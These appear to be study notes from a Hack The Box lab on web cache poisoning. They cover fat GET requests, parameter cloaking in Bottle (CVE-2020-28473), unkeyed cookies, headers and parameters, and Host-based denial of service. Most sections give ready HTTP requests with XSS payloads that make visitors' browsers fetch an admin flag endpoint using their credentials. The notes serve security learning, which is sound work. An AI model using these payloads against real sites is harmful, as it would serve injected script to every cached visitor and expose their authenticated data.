## FAT GET
This attack happens via FAT GET(basically a GET request with a POST body as well) which by default should't happens anything but in some cases, specifically on miss-configurations this could lead to a potential injection. The reason is the back-end prefer the Body parameters instead of the ones in URL.
USUALLY THIS BUG IS IN THE WEB-SERVER CONFIG AND NOT IN THE WEB-APP SELF.
Example upon this you can see that GET params are sent both via URL and body. If the back-end prefer(wrongly) the body the language used will be German and not English!
```
GET /index.php?language=en HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 11
language=de
```
Leading to something similar via refleced XSS on GET FAT BODY request:
```
GET /index.php?language=de HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 142
language="><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();</script>
```
TIPS: remember to test for all params where to inject your payload as if you see that your payload gets HTML encoded then it means that it have been cleaned up before processing and you should move on with other params!

## PARAMETER CLOAKING
Same as in the FAT GET we want to create discrepancy in the request in order to trick the web-cache and inject our payload. It's similar to the request before but it involves sending multiple request via ;(separator).
Described in **CVE-2020-28473** on Python framework **Bottle(vers 0 to 0.12.19)** if we send something similar:
```
GET /?language=en&a=b;language=de HTTP/1.1
Host: cloak.wcp.htb
```
In this case in the POC &a=b is placed before **language=de(KEYED)** to HIDE it, so that Bottle the back-end will ignore first language=en and  effectively parse only the second parameter also **language=de.**
This can lead to something similar to exploit a XSS:
```
GET /?language=de&a=b;language=%22%3E%3Cscript%3Evar%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27%2Fadmin%3Freveal_flag%3D1%27%2C%20false%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3B%3C%2Fscript%3E HTTP/1.1
```
TIPS: 
1) Remember to test for all params where to inject your payload (&a=b;) as if you see that your payload gets HTML encoded then it means that it have been cleaned up before processing and you should move on with other params! 
2) Also you might need to find a specific UNKEYED parameter from the website and not just a=b(just an example) otherwise the cache will no be saved since you are using params that aren't UNKEYED!


## UNKEYED COOKIE
This attack happens specifically on the Cookie header in a request is unkekeyed, thus will be able to inject our payload in the cookie.
If we take as an example that cookie tracks consent to "do something" from a user. Injecting into cookie will get consent from anyone surfing the website:
```

GET /index.php HTTP/1.1
Host: webcache.htb
Cookie: consent=1;
```


## DOS
Here the idea is to inject into a UNKEYED parameter to point to a nonexistent resource with will create a DOS /Delay in the back-end.
Take as an example that Host is unkeyed and tells to the back-end what to fetch:
```
GET / HTTP/1.1
Host: webcache.htb:80
(This will pass thru as HTTP of this host works)
```
But if would send this:
```
GET / HTTP/1.1
Host: webcache.htb:1337
```
(Will fail as it won't find this resource and create a DOS)

## UNKEYED HEADERS
This will happen if any of the HTTP headers in the request are UNKEYED and we succeed into injecting a PAYLOAD into web-cache.
Take as an example that we find a leftover from DEVS of an old header:
```
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb"></script><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();//
```
(We could use it to perform a Webcache poison via Stored XSS)

## UNKEYED GET params
This will be the easiest as as the name tells it targets the params of a GET request in the URL.
The key here is to manually fuzz and test for which params are keyed and which no. When you identify you can inject you UNKEYEDPARAM=MYPAYLOAD and poison the webcache!
Take as example that you find that content=UNKEYED, then you can send something similar:
```
GET /index.php?content=%3Cscript%3Evar%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27%2Fadmin.php%3Freveal_flag%3D1%27%2C%20false%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3B%3C%2Fscript%3E&language=de HTTP/1.1
```
(In this case content=PAYLOAD and we had to use language= a never used one in order to inject the entry into cache!)

## Cache busters
This is basically a usefully tips on how to refresh the web-cache by sending some "bogus" data into KEYED params so the web-cache will be refreshed and resettled and you don't need to wait at all for the cache to expire!